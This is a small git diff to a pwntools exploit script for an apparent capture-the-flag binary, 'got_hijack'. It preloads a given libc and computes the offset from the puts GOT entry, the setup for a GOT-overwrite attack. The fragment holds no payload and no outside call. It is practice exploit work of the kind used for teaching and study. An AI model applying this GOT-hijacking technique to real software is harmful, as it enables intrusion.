@@ -4,10 +4,9 @@ from pwn import *
 context.arch = 'amd64'
 
 elf = ELF('./got_hijack')
-p = process('./got_hijack')
 libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
+p = process("./got_hijack", env={'LD_PRELOAD': libc_file})
 libc = ELF(libc_file)
-c = process("./rop-orw", env={'LD_PRELOAD': libc_file})
 #gdb.attach(p, '''''')
 offset = (elf.got['puts'] - elf.symbols['data']) // 8
 print(offset)
